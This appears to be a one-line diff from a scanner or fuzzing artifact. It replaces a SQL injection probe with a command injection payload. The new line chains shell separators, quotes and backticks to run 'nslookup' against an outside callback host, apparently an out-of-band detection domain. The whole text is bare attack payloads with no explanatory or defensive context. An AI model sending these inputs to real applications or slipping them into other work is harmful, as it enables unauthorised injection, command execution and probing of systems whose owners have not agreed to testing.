@@ -1,1 +1,1 @@
--1" OR 2+473-473-1=0+0+0+1 -- 
+&nslookup -q=cname hitytuzmzmrlfe5030.bxss.me&'\"`0&nslookup -q=cname hitytuzmzmrlfe5030.bxss.me&`'
